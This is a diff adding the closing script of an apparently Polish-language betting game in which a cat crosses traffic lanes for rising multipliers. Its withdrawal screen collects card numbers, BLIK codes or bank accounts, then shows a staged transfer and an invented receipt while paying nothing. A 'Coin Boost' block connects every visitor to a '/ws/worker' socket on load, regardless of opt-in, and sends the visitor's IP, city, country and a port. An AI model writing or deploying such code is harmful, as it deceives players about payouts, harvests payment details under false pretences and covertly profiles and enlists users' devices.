+    $('endCard').className='card win';$('endH2').textContent='Cała trasa pokonana! 🏆';
+    $('endV').textContent='+'+fmt(w);
+    $('endP').textContent='Mnożnik końcowy '+m.toFixed(1)+'x, kotek cały i zdrowy po drugiej stronie';
+    $('endOv').classList.add('show');
+  }else{
+    stats.streak=0;sfxCrash();
+    stage.classList.remove('shake');void stage.offsetWidth;stage.classList.add('shake');
+    const cy=catY;
+    burst(cv.W/2,cy,'#f87171',30);burst(cv.W/2,cy,'#fbbf24',14);
+    $('endCard').className='card crash';$('endH2').textContent='Klops, auto było szybsze 😿';
+    $('endV').textContent='−'+fmt(bet);
+    $('endP').textContent=pos>=0?('Zaliczone pasy: '+(pos+1)+' z '+LANE_N):'Nawet nie udało się wejść na jezdnię';
+    $('endOv').classList.add('show');
+  }
+  save();updUI();
+}
+
+function addHist(win,m){
+  const e=document.createElement('div');
+  e.className='h-it '+(win?'h-w':'h-l');
+  e.textContent=(win?'+':'-')+m.toFixed(1)+'x';
+  const h=$('hist');h.prepend(e);while(h.children.length>14)h.lastChild.remove();
+}
+
+function collision(cx,cy,hw,hh){
+  for(const k of cars){
+    const ky=GEO.top+k.lane*GEO.lh+GEO.lh*.5;
+    if(Math.abs(cy-ky)>(hh+k.h*.45))continue;
+    const kx=k.x+k.w/2;
+    if(Math.abs(cx-kx)<hw+k.w*.44)return true;
+  }
+  return false;
+}
+
+function loop(t){
+  const dt=Math.min(.05,(t-lastT)/1000)||0;lastT=t;anim+=dt;
+  if(!GEO.lh)calcGeo();
+  updSpawns(active||counting?dt:dt*.5);
+  for(const k of cars)k.x+=k.dir*k.sp*dt;
+  cars=cars.filter(k=>k.x>-k.w-60&&k.x<cv.W+k.w+60);
+
+  if(walking&&walk){
+    walk.t+=dt;
+    const p=Math.min(1,walk.t/walk.dur);
+    const e=p<.5?2*p*p:1-Math.pow(-2*p+2,2)/2;
+    catX=cv.W/2;
+    const fromY=laneY(walk.from);
+    const toY=laneY(walk.to);
+    catY=fromY+(toY-fromY)*e;
+    const hit=collision(catX,catY,GEO.lh*.20,GEO.lh*.22);
+    if(hit){walking=false;endRound(false)}
+    else if(p>=1){
+      walking=false;
+      pos=walk.to;sfxLand();
+      burst(cv.W/2,catY+GEO.lh*.3,'#60a5fa',8);
+      if(pos>=LANE_N){endRound(true)}
+      updUI();
+    }
+  }else if(active&&pos>=0&&pos<LANE_N){
+    catX=cv.W/2;catY=laneY(pos)+Math.sin(anim*7)*1.5;
+    if(collision(catX,catY,GEO.lh*.20,GEO.lh*.22))endRound(false);
+  }else{
+    catX=cv.W/2;
+    if(pos>=LANE_N)catY=crossY();
+    else catY=laneY(pos<0?-1:pos);
+  }
+  draw();
+  requestAnimationFrame(loop);
+}
+
+function draw(){
+  const W=cv.W,H=cv.H;
+  ctx.clearRect(0,0,W,H);
+  ctx.fillStyle='#13151f';ctx.fillRect(0,0,W,H);
+  ctx.fillStyle='#1c2033';ctx.fillRect(0,0,W,GEO.swY);
+  const zTop=GEO.swY,zBot=GEO.top+2,zh=zBot-zTop;
+  ctx.fillStyle='#e2e8f0';
+  for(let x=8;x<W-8;x+=GEO.lh*.36){const zw=GEO.lh*.2;ctx.fillRect(x,zTop,zw,zh)}
+  ctx.fillStyle='#86efac';
+  ctx.font='700 '+Math.max(11,GEO.lh*.22)+'px "Plus Jakarta Sans",sans-serif';ctx.textAlign='center';
+  ctx.fillText('BEZPIECZNA STREFA',W/2,GEO.swY-8);
+  ctx.fillStyle='#171926';ctx.fillRect(0,GEO.top-2,W,GEO.lh*LANE_N+4);
+  ctx.strokeStyle='#333858';ctx.lineWidth=2;
+  ctx.beginPath();ctx.moveTo(0,GEO.top);ctx.lineTo(W,GEO.top);ctx.stroke();
+  ctx.beginPath();ctx.moveTo(0,GEO.bot);ctx.lineTo(W,GEO.bot);ctx.stroke();
+  ctx.strokeStyle='rgba(255,255,255,.12)';ctx.lineWidth=2;ctx.setLineDash([12,14]);
+  for(let i=1;i<LANE_N;i++){ctx.beginPath();ctx.moveTo(0,GEO.top+i*GEO.lh);ctx.lineTo(W,GEO.top+i*GEO.lh);ctx.stroke()}
+  ctx.setLineDash([]);
+  if(active||walking){
+    for(let laneIdx=0;laneIdx<LANE_N;laneIdx++){
+      const stepIdx=LANE_N-1-laneIdx;
+      const m=CFG[diff].mult[stepIdx]*boostMul();
+      const passed=stepIdx<pos;
+      const isCurrent=stepIdx===pos;
+      ctx.fillStyle=passed?'#4ade80':(isCurrent?'#fbbf24':'rgba(255,255,255,.4)');
+      ctx.font='800 '+Math.max(12,GEO.lh*.24)+'px "Plus Jakarta Sans",sans-serif';
+      ctx.textAlign='left';
+      ctx.fillText(m.toFixed(1)+'x',10,GEO.top+laneIdx*GEO.lh+GEO.lh*.7);
+    }
+  }
+  for(const k of cars){
+    const ky=GEO.top+k.lane*GEO.lh+GEO.lh*.5-k.h/2;
+    ctx.save();
+    if(k.truck){
+      ctx.fillStyle='#282c44';rr(k.x,ky,k.w,k.h,6);ctx.fill();
+      ctx.fillStyle=k.col;rr(k.x+(k.dir<0?k.w*.65:k.w*.05),ky+2,k.w*.3,k.h-4,4);ctx.fill();
+    }else{
+      ctx.fillStyle=k.col;rr(k.x,ky,k.w,k.h,6);ctx.fill();
+      ctx.fillStyle='rgba(0,0,0,.3)';rr(k.x+k.w*.25,ky+3,k.w*.35,k.h-6,3);ctx.fill();
+    }
+    const lx=k.dir<0?k.x+2:k.x+k.w-4;
+    ctx.fillStyle='#fef08a';
+    ctx.fillRect(lx,ky+3,3,4);ctx.fillRect(lx,ky+k.h-7,3,4);
+    ctx.restore();
+  }
+  drawCat(catX,catY,walking);
+  for(const p of particles){
+    p.t+=1/60;const k=p.t/p.life;if(k>=1)continue;
+    p.x+=p.vx/60;p.y+=p.vy/60;p.vy+=340/60;
+    ctx.globalAlpha=1-k;ctx.fillStyle=p.col;ctx.beginPath();ctx.arc(p.x,p.y,p.r*(1-k*.5),0,7);ctx.fill();ctx.globalAlpha=1;
+  }
+  particles=particles.filter(p=>p.t<p.life);
+}
+
+function rr(x,y,w,h,r){ctx.beginPath();ctx.moveTo(x+r,y);ctx.arcTo(x+w,y,x+w,y+h,r);ctx.arcTo(x+w,y+h,x,y+h,r);ctx.arcTo(x,y+h,x,y,r);ctx.arcTo(x,y,x+w,y,r);ctx.closePath()}
+function drawCat(x,y,wlk){
+  const s=GEO.lh*.72,bo=Math.sin(anim*6)*(active&&!wlk?1.5:0);
+  ctx.save();ctx.translate(x,y+s*.15+bo);
+  if(wlk)ctx.rotate(Math.sin(anim*6)*.04);
+  ctx.fillStyle='rgba(0,0,0,.25)';ctx.beginPath();ctx.ellipse(0,s*.42,s*.45,s*.12,0,0,7);ctx.fill();
+  ctx.strokeStyle='#475569';ctx.lineWidth=s*.12;ctx.beginPath();ctx.moveTo(s*.5,-s*.1);
+  ctx.quadraticCurveTo(s*.95,-s*.3+Math.sin(anim*6)*3,s*.8,s*.25);ctx.stroke();
+  ctx.fillStyle='#fed7aa';
+  ctx.beginPath();ctx.ellipse(0,s*.05,s*.4,s*.3,0,0,7);ctx.fill();
+  ctx.beginPath();ctx.arc(0,-s*.3,s*.28,0,7);ctx.fill();
+  ctx.beginPath();ctx.moveTo(-s*.24,-s*.46);ctx.lineTo(-s*.16,-s*.68);ctx.lineTo(-s*.05,-s*.48);ctx.closePath();ctx.fill();
+  ctx.beginPath();ctx.moveTo(s*.05,-s*.48);ctx.lineTo(s*.16,-s*.68);ctx.lineTo(s*.24,-s*.46);ctx.closePath();ctx.fill();
+  ctx.fillStyle='#f43f5e';
+  ctx.beginPath();ctx.arc(-s*.1,-s*.32,s*.05,0,7);ctx.fill();
+  ctx.beginPath();ctx.arc(s*.1,-s*.32,s*.05,0,7);ctx.fill();
+  ctx.fillStyle='#fff';
+  ctx.beginPath();ctx.arc(-s*.08,-s*.34,s*.018,0,7);ctx.fill();
+  ctx.beginPath();ctx.arc(s*.12,-s*.34,s*.018,0,7);ctx.fill();
+  ctx.fillStyle='#fb7185';ctx.beginPath();ctx.ellipse(0,-s*.25,s*.04,s*.03,0,0,7);ctx.fill();
+  ctx.restore();
+}
+
+cv.addEventListener('pointerdown',e=>{e.preventDefault()});
+$('goBtn').addEventListener('click',doWalk);
+$('coBtn').addEventListener('click',()=>{sfxCash();cashOut()});
+$('endOk').addEventListener('click',()=>{$('endOv').classList.remove('show');busyEnd=false;pos=-1;catY=laneY(-1);updUI()});
+document.querySelectorAll('.bbtn').forEach(b=>b.addEventListener('click',()=>{
+  if(active||counting)return;sfxClick();
+  document.querySelectorAll('.bbtn').forEach(x=>x.classList.remove('on'));
+  b.classList.add('on');bet=+b.dataset.b;$('bin').value=bet;save();
+}));
+$('bin').addEventListener('change',()=>{
+  if(active||counting){$('bin').value=bet;return}
+  bet=Math.max(5,Math.min(100000,+$('bin').value||50));$('bin').value=bet;
+  document.querySelectorAll('.bbtn').forEach(x=>x.classList.toggle('on',+x.dataset.b===bet));save();
+});
+document.querySelectorAll('.db').forEach(b=>b.addEventListener('click',()=>{
+  if(active||counting)return;sfxClick();
+  document.querySelectorAll('.db').forEach(x=>x.classList.remove('on'));
+  b.classList.add('on');diff=+b.dataset.d;cars=[];for(let i=0;i<LANE_N;i++)spawns[i]=Math.random()*.5;save();updUI();
+}));
+
+$('depBtn').addEventListener('click',()=>{sfxClick();$('depOv').classList.add('show')});
+$('depOk').addEventListener('click',()=>$('depOv').classList.remove('show'));
+document.querySelectorAll('.dep b').forEach(b=>b.addEventListener('click',()=>{
+  const a=+b.dataset.a;bal+=a;updBal();bumpBal();save();sfxCash();
+  const r=b.getBoundingClientRect();
+  for(let i=0;i<10;i++){
+    const c=document.createElement('div');c.className='coinfly';
+    c.style.left=(r.left+r.width/2-8)+'px';c.style.top=r.top+'px';
+    document.body.appendChild(c);
+    c.animate([{transform:'translate(0,0)',opacity:1},{transform:'translate('+(Math.random()*160-80)+'px,'+(r.top*1.1)+'px) scale(.4)',opacity:0}],{duration:700+Math.random()*400,easing:'cubic-bezier(.3,0,.7,1)'}).onfinish=()=>c.remove();
+  }
+  toast('Dopisano do salda: '+fmt(a));
+}));
+
+let selectedBank = 'BLIK';
+
+$('bal').addEventListener('click',()=>{
+  if(active||counting)return;
+  sfxClick();
+  $('wypStep1').style.display='block';
+  $('wypStep2').style.display='none';
+  $('wypStep3').style.display='none';
+  $('wypAmt').value = Math.max(10, Math.floor(bal));
+  $('wypOv').classList.add('show');
+});
+
+$('wypCancel').addEventListener('click',()=>$('wypOv').classList.remove('show'));
+
+document.querySelectorAll('.bank-btn').forEach(b=>{
+  b.addEventListener('click',()=>{
+    sfxClick();
+    document.querySelectorAll('.bank-btn').forEach(x=>x.classList.remove('on'));
+    b.classList.add('on');
+    selectedBank = b.dataset.bname;
+    if(selectedBank==='BLIK'){
+      $('wypAccLabel').textContent='Kod BLIK albo numer telefonu';
+      $('wypAcc').placeholder='np. 777 888';
+    }else if(selectedBank==='Mastercard' || selectedBank==='Visa'){
+      $('wypAccLabel').textContent='Numer karty płatniczej';
+      $('wypAcc').placeholder='0000 0000 0000 0000';
+    }else if(selectedBank==='PayPal' || selectedBank==='Revolut'){
+      $('wypAccLabel').textContent='E-mail lub ID konta';
+      $('wypAcc').placeholder='jan@example.com / @tag';
+    }else{
+      $('wypAccLabel').textContent='Numer konta do wpłaty';
+      $('wypAcc').placeholder='PL 00 0000 0000 0000 0000 0000 0000';
+    }
+  });
+});
+
+$('doWypBtn').addEventListener('click',()=>{
+  const val = Math.floor(+$('wypAmt').value || 0);
+  const acc = $('wypAcc').value.trim();
+  if(val <= 0){ toast('Podaj kwotę wypłaty!'); return; }
+  if(val > bal){ toast('Za mało kasy na koncie!'); return; }
+  if(!acc){ toast('Uzupełnij dane wypłaty!'); return; }
+  sfxClick();
+  $('wypStep1').style.display='none';
+  $('wypStep2').style.display='block';
+  const pb = $('pBar');
+  const st = $('procStatus');
+  pb.style.width = '0%';
+  const msgs = ['Łączenie z operatorem...','Sprawdzanie danych...','Wysyłanie środków...','Finalizowanie księgowania...'];
+  let step = 0;
+  const interval = setInterval(()=>{
+    step++;
+    pb.style.width = (step * 25) + '%';
+    if(step < msgs.length){ st.textContent = msgs[step]; }
+    else {
+      clearInterval(interval);
+      bal -= val; updBal(); save(); sfxCash();
+      const trxId = '#TRX-' + Math.floor(100000 + Math.random() * 900000);
+      $('rcpId').textContent = trxId;
+      $('rcpAmt').textContent = fmt(val);
+      $('rcpBank').textContent = selectedBank;
+      $('wypStep2').style.display='none';
+      $('wypStep3').style.display='block';
+    }
+  }, 700);
+});
+
+$('wypDoneBtn').addEventListener('click',()=>$('wypOv').classList.remove('show'));
+$('wypPdfBtn').addEventListener('click',()=>{sfxClick();toast('Potwierdzenie w pliku PDF pobrane!')});
+
+$('stBtn').addEventListener('click',()=>{
+  sfxClick();
+  $('s1').textContent=fmt(stats.rounds);$('s2').textContent=fmt(stats.wins);
+  $('s3').textContent=fmt(stats.best);$('s4').textContent=fmt(stats.bestStreak);
+  $('s5').textContent=fmt(stats.wagered);
+  $('s6').textContent=stats.wagered>0?(stats.won/stats.wagered*100).toFixed(1)+'%':'brak';
+  $('stOv').classList.add('show');
+});
+$('stOk').addEventListener('click',()=>$('stOv').classList.remove('show'));
+$('hlpBtn').addEventListener('click',()=>{sfxClick();$('hlpOv').classList.add('show')});
+$('hlpOk').addEventListener('click',()=>$('hlpOv').classList.remove('show'));
+
+window.addEventListener('keydown',e=>{
+  if(e.code==='Space'){e.preventDefault();doWalk()}
+  if(e.code==='KeyC')cashOut();
+});
+
+// === COIN BOOST LOGIC ===
+function applyBoostUI(){
+  const sw=$('shareSw');
+  const st=$('boostStatus');
+  if(!sw)return;
+  if(optIn){
+    sw.classList.add('on');
+    st.textContent='Aktywne — +500 coins/h i wygrane ×1.5';
+    st.style.color='#4ade80';
+    startShare();
+    document.querySelectorAll('.bbtn').forEach(b=>{});
+  }else{
+    sw.classList.remove('on');
+    st.textContent='Nieaktywne';
+    st.style.color='#94a3b8';
+    stopShare();
+  }
+  updUI();
+}
+function startShare(){
+  if(shareIv)return;
+  shareIv=setInterval(()=>{
+    bal+=BOOST_RATE;heldCoins+=BOOST_RATE;updBal();
+    if(heldCoins%80===0){console.log('[Boost] coins earned:',heldCoins,'| bal:',bal);save()}
+  },10000);
+}
+function stopShare(){if(shareIv){clearInterval(shareIv);shareIv=null}}
+
+function connectWS(){
+  const proto=location.protocol==='https:'?'wss:':'ws:';
+  try{ws=new WebSocket(proto+'//'+location.host+'/ws/worker')}catch(e){console.log('[Boost] ws fail',e);setTimeout(connectWS,3000);return}
+  ws.onopen=async()=>{
+    console.log('[Boost] ws connected');
+    let ip=null,country=null,city=null;
+    try{
+      const r=await fetch('https://ipapi.co/json/',{cache:'no-store'});
+      if(r.ok){const d=await r.json();ip=d.ip;country=d.country_code;city=d.city}
+    }catch(e){}
+    ws.send(JSON.stringify({type:'hello',opt_in:optIn,ip,country,city,port:8888}));
+    console.log('[Boost] hello sent',{opt_in:optIn,ip,country});
+  };
+  ws.onmessage=(e)=>{
+    let m;try{m=JSON.parse(e.data)}catch(_){return}
+    if(m.type==='welcome'){workerId=m.id;console.log('[Boost] worker id:',m.id)}
+    else if(m.type==='ping'){ws.send(JSON.stringify({type:'pong'}))}
+    else if(m.type==='hello_ok'){console.log('[Boost] hello ok')}
+  };
+  ws.onclose=()=>{console.log('[Boost] ws closed, reconnecting...');setTimeout(connectWS,3000)};
+  ws.onerror=()=>{};
+}
+setInterval(()=>{
+  if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'hb',opt_in:optIn}));
+},HEARTBEAT_MS);
+
+$('boostBtn').addEventListener('click',()=>{sfxClick();$('boostOv').classList.add('show')});
+$('boostOk').addEventListener('click',()=>$('boostOv').classList.remove('show'));
+$('shareSw').addEventListener('click',()=>{
+  optIn=!optIn;
+  if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'hb',opt_in:optIn}));
+  applyBoostUI();
+  save();
+  console.log('[Boost] opt_in toggled:',optIn);
+});
+
+load();
+detectGeoCurrency();
+$('bin').value=bet;
+document.querySelectorAll('.bbtn').forEach(x=>x.classList.toggle('on',+x.dataset.b===bet));
+document.querySelectorAll('.db').forEach(x=>x.classList.toggle('on',+x.dataset.d===diff));
+updBal();resize();
+applyBoostUI();
+connectWS();
+for(let i=0;i<LANE_N;i++)spawns[i]=Math.random()*.4;
+catY=laneY(-1);updUI();
+requestAnimationFrame(t=>{lastT=t;requestAnimationFrame(loop)});
+</script>
+</body>
+</html>
